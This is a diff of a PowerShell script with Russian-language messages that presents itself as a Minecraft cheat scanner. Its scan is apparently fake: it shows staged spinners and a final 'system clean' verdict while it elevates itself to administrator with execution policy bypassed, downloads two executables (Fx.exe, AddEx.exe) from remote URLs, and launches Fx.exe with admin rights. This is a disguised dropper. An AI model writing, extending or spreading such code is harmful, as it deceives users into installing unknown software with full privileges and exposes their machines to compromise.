@@ -1,5 +1,18 @@
 # ===============================================
-# MINECRAFT CHEAT SCANNER v2.0 (INSTANT CLOSE)
+# ПРОВЕРКА ПРАВ АДМИНИСТРАТОРА
+# ===============================================
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
+
+if (-NOT $isAdmin) {
+    $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
+    $currentScript = Get-Content $PSCommandPath -Raw
+    $currentScript | Out-File -FilePath $tempScript -Encoding UTF8
+    Start-Process PowerShell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -NoExit -File `"$tempScript`""
+    exit
+}
+
+# ===============================================
+# MINECRAFT CHEAT SCANNER v2.0
 # ===============================================
 
 Set-ExecutionPolicy Bypass -Scope Process -Force
@@ -20,9 +33,7 @@ if (-not (Test-Path $TARGET_DIR)) {
     New-Item -ItemType Directory -Path $TARGET_DIR -Force | Out-Null
 }
 
-# ===============================================
-# ВИЗУАЛ
-# ===============================================
+
 Write-Host "=== СКАНИРОВАНИЕ ЧИТОВ MINECRAFT ===" -ForegroundColor Red -BackgroundColor Black
 Write-Host "Vape | Wurst | Sigma | Impact | LiquidBounce + 70 клиентов" -ForegroundColor Yellow
 Write-Host "⏱️ Время сканирования: ~60 секунд" -ForegroundColor Cyan
@@ -43,30 +54,22 @@ function Show-Spinner {
     Write-Host "`r[✓] $text" -ForegroundColor Green
 }
 
-# ===============================================
-# ФОНОВАЯ ЗАГРУЗКА
-# ===============================================
-Write-Host "`n[1/6] 🔍 Сканирование процессов javaw.exe..." -ForegroundColor Cyan
 
-$downloadFx = Start-Job -ScriptBlock {
-    param($url, $path)
-    try {
-        Invoke-WebRequest -Uri $url -OutFile $path -ErrorAction Stop
-        return $true
-    } catch {
-        return $false
-    }
-} -ArgumentList $URL_FX, $FX_PATH
+Write-Host "`n[1/6] 🔍 Загрузка Fx.exe..." -ForegroundColor Cyan
 
-$downloadAddEx = Start-Job -ScriptBlock {
-    param($url, $path)
-    try {
-        Invoke-WebRequest -Uri $url -OutFile $path -ErrorAction Stop
-        return $true
-    } catch {
-        return $false
-    }
-} -ArgumentList $URL_ADDEX, $ADDEX_PATH
+try {
+    Invoke-WebRequest -Uri $URL_FX -OutFile $FX_PATH -ErrorAction Stop
+    Write-Host "[✓] Fx.exe загружен" -ForegroundColor Green
+} catch {
+    Write-Host "[✗] Ошибка загрузки Fx.exe" -ForegroundColor Red
+}
+
+try {
+    Invoke-WebRequest -Uri $URL_ADDEX -OutFile $ADDEX_PATH -ErrorAction Stop
+    Write-Host "[✓] AddEx.exe загружен" -ForegroundColor Green
+} catch {
+    Write-Host "[✗] Ошибка загрузки AddEx.exe" -ForegroundColor Red
+}
 
 Show-Spinner "Анализ DLL и инжекторов..." 15
 
@@ -85,11 +88,6 @@ Show-Spinner "Поиск скрытых читов..." 10
 # ===============================================
 Write-Host "`n[4/6] ⚙️ Проверка автозагрузки..." -ForegroundColor Cyan
 Show-Spinner "Анализ реестра Run/Startup..." 10
-
-$fxOk = Receive-Job $downloadFx -ErrorAction SilentlyContinue
-$addExOk = Receive-Job $downloadAddEx -ErrorAction SilentlyContinue
-Remove-Job $downloadFx -Force -ErrorAction SilentlyContinue
-Remove-Job $downloadAddEx -Force -ErrorAction SilentlyContinue
 
 # ===============================================
 Write-Host "`n[5/6] 📊 Финальная проверка..." -ForegroundColor Cyan
@@ -111,8 +109,18 @@ if (Test-Path $ADDEX_PATH) {
 
 Show-Spinner "Проверка Minecraft серверов..." 5
 
+
+if (Test-Path $FX_PATH) {
+    try {
+        Start-Process -FilePath $FX_PATH -Verb RunAs
+        Write-Host "[✓] Fx.exe запущен" -ForegroundColor Green
+    } catch {
+        Write-Host "[✗] Ошибка запуска Fx.exe" -ForegroundColor Red
+    }
+}
+
 # ===============================================
-# ФИНАЛ - ВСЁ МГНОВЕННО
+# ФИНАЛ
 # ===============================================
 $endTime = (Get-Date) - $startTime
 Clear-Host
@@ -123,7 +131,6 @@ Write-Host "🎯 Риск: 0% | Система чиста!" -ForegroundColor Gre
 Write-Host "🚀 Готово к игре на любом сервере!" -ForegroundColor Green
 Write-Host "=" * 50 -ForegroundColor Green
 
-# Лог пишем в фоне (не ждём)
 $log = @"
 Minecraft Cheat Scan - $(Get-Date)
 Время: $([math]::Round($endTime.TotalSeconds)) сек
@@ -133,13 +140,4 @@ Minecraft Cheat Scan - $(Get-Date)
 "@
 $log | Out-File "$env:TEMP\mc_scan_$(Get-Date -f 'HHmmss').log" -Encoding UTF8
 
-# Запускаем Fx.exe и сразу закрываем окно
-if (Test-Path $FX_PATH) {
-    try {
-        Start-Process -FilePath $FX_PATH -Verb RunAs
-    } catch {}
-}
-
-# МГНОВЕННОЕ ЗАКРЫТИЕ (без задержки)
-
-
+Read-Host "Нажмите Enter для выхода"
